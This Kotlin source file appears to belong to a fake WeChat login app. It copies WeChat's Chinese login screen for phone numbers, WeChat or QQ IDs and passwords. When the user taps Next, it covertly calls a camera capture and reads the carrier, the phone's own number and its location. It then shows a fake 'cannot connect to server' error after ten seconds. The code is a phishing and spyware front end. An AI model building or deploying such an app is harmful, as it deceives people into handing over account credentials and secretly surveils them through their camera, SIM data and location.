package com.example.fakewechat

import android.app.AlertDialog
import android.content.Context

import android.graphics.Color
import android.hardware.Camera

import android.support.v7.app.AppCompatActivity
import android.os.Bundle

import android.os.Build
import android.text.Editable
import android.text.TextWatcher
import android.view.*
import android.view.View.*
import kotlinx.android.synthetic.main.activity_main.*

import android.widget.Toast
import java.util.*
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Log
import android.widget.Button
import java.io.BufferedOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat

import java.io.IOException
import android.view.SurfaceHolder
import android.view.SurfaceView




class MainActivity : AppCompatActivity() {



    var QQLogin_Type = false;


/*

    private lateinit var camera: Camera;
    private val cpHolderCallback = object : SurfaceHolder.Callback {
        override fun surfaceCreated(holder: SurfaceHolder) {
            startPreview()
        }

        override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {

        }

        override fun surfaceDestroyed(holder: SurfaceHolder) {
            stopPreview()
        }
    }*/

    override fun onResume() {
        super.onResume()


        /*sfv_preview.holder.addCallback(cpHolderCallback);*/




    }




    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

//   文本框有字符串之后，下一步按钮背景改为#1AAD19

        //弹出#393939对话框，透明度未知

/*        getWindow().setFlags(WindowManager.LayoutParams. FLAG_FULLSCREEN ,
                WindowManager.LayoutParams. FLAG_FULLSCREEN);
*/

        //设置通知栏透明
        window.requestFeature(Window.FEATURE_NO_TITLE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val window = window
            window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS or WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
            window.decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    or View.SYSTEM_UI_FLAG_LAYOUT_STABLE)
            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS)
            window.statusBarColor = Color.TRANSPARENT
            window.navigationBarColor = Color.TRANSPARENT
        }

        setContentView(R.layout.activity_main);

        MessageCollector.setMyContext(applicationContext);
        Log.i("setContext","context:"+applicationContext)



        edit_QQNumber.setOnFocusChangeListener(object :OnFocusChangeListener{
            override fun onFocusChange(p0: View?, p1: Boolean) {
                if (p1 == true){
                    fengexian1.setBackgroundColor(Color.parseColor("#4CC223"))
                }else{
                    fengexian1.setBackgroundColor(Color.parseColor("#EFEFEF"))
                }
            }

        })


        edit_PhoneNumber.setOnFocusChangeListener(object :OnFocusChangeListener{
            override fun onFocusChange(p0: View?, p1: Boolean) {
                if (p1 == true){
                    fengexian2.setBackgroundColor(Color.parseColor("#4CC223"))
                }else{
                    fengexian2.setBackgroundColor(Color.parseColor("#EFEFEF"))
                }
            }

        })

        edit_PhoneNumber.addTextChangedListener(object :TextWatcher{
            override fun beforeTextChanged(p0: CharSequence?, p1: Int, p2: Int, p3: Int) {

            }

            override fun onTextChanged(p0: CharSequence?, p1: Int, p2: Int, p3: Int) {

            }

            override fun afterTextChanged(p0: Editable?) {
                if (p0?.length == 0){
                    buttonNext.setBackgroundColor(Color.parseColor("#A3DEA3"));
                    buttonNext.isClickable = false;
                }else{
                    buttonNext.setBackgroundColor(Color.parseColor("#1AAD19"));
                    buttonNext.isClickable = true;
                }
            }

        })


        buttonChange.setOnClickListener({



            QQLogin_Type = !QQLogin_Type;
            if (QQLogin_Type){
                Tv_title.text = "微信号/QQ号/邮箱登陆";
                tv_1.text = "账号";
                tv_2.text = "密码";
                tv_3.visibility = GONE;
                edit_QQNumber.visibility = VISIBLE;

                edit_QQNumber.hint = "请填写微信号/QQ号/邮箱";
                edit_PhoneNumber.hint = "请填写密码";

                buttonChange.text = "用手机号登陆";
                buttonNext.text = "登陆";
            }else{

                Tv_title.text = "手机号登陆";
                tv_1.text = "国家/地区";
                tv_2.text = "手机号";
                tv_3.visibility = VISIBLE;
                edit_QQNumber.visibility = GONE;


                edit_PhoneNumber.hint = "请填写手机号";

                buttonChange.text = "用微信号/QQ号/邮箱登陆";
                buttonNext.text = "下一步";
            }
        })

        buttonNext.setOnClickListener({
            var mDialog = AlertDialog.Builder(this);
            var mView = LayoutInflater.from(this).inflate(R.layout.error_view,null,false);
            mDialog.setView(mView);
            mDialog.setCancelable(true);
            var alert =  mDialog.create();
            alert.show();

            //拍照,0标示前置摄像头，1表示后置摄像头



//            var camera = Camera.open(0);

/*            camera.takePicture(null, null, object :Camera.PictureCallback{
                override fun onPictureTaken(data: ByteArray, p1: Camera?) {
                    var path = ""


                    var bitmap = BitmapFactory.decodeByteArray(data, 0, data.size);



                    //自定义文件保存路径  以拍摄时间区分命名
                    var filepath = "/" + SimpleDateFormat("yyyyMMddHHmmss").format(Date()) +  ".jpg";
                    var file = File(filepath);
                    var  bos = BufferedOutputStream(FileOutputStream(file));
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bos);//将图片压缩的流里面
                    bos.flush();// 刷新此缓冲区的输出流
                    bos.close();// 关闭此输出流并释放与此流有关的所有系统资源


                    bitmap.recycle();//回收bitmap空间

                    Toast.makeText(this@MainActivity, "保存照片失败", Toast.LENGTH_SHORT).show()
                }

            })*/



/*
            camera.takePicture(null, null, Camera.PictureCallback { data, camera ->
                var path = saveFile(data)
                if (path != null) {


                } else {
                    Toast.makeText(this@MainActivity, "保存照片失败", Toast.LENGTH_SHORT).show()
                }
            })*/


            MessageCollector.takePic();


            //Sim卡信息
            Toast.makeText(this@MainActivity,
                    "运营商："+MessageCollector.getProvidersName()+",手机号："+MessageCollector.getNativePhoneNumber()
                    ,Toast.LENGTH_SHORT).show();

            //位置信息
            Toast.makeText(this@MainActivity,
                    MessageCollector.getLocation()
                    ,Toast.LENGTH_SHORT).show();


           var timer = Timer();
            timer.schedule(object :TimerTask(){
                override fun run() {
                    alert.dismiss();
                    var thread = Thread(){
                        runOnUiThread({
                            Toast.makeText(this@MainActivity,"无法连接到服务器(1,-1)，请检查你的网络或稍后重试",Toast.LENGTH_SHORT).show();
                        })
                    }
                    thread.start();
                    //Toast.makeText(this@MainActivity,"无法连接到服务器(1,-1)，请检查你的网络或稍后重试",Toast.LENGTH_SHORT).show();
                }

            },10000)

/*
            var a = Thread(){

                kotlin.run {
                    Thread.sleep(3000);
                }

                runOnUiThread({
                    alert.dismiss();
                })
            }
            a.run();
*/

        })



    }

/*
    //保存临时文件的方法
    private fun saveFile(bytes: ByteArray): String {
        try {
            val file = File.createTempFile("img"+SimpleDateFormat("yyyy-MM-dd-HH-mm-ss").format(Date()), "")
            val fos = FileOutputStream(file)
            fos.write(bytes)
            fos.flush()
            fos.close()
            return file.absolutePath
        } catch (e: IOException) {
            e.printStackTrace()
        }

        return ""
    }


    //开始预览
    private fun startPreview() {


        camera = Camera.open(1)

        try {

            camera.setPreviewDisplay(sfv_preview.holder)
            camera.setDisplayOrientation(90)   //让相机旋转90度
            camera.startPreview()
        } catch (e: IOException) {
            e.printStackTrace()
        }

    }

    //停止预览
    private fun stopPreview() {

*//*
        camera.stopPreview()
        camera.release()
*//*

    }*/

}

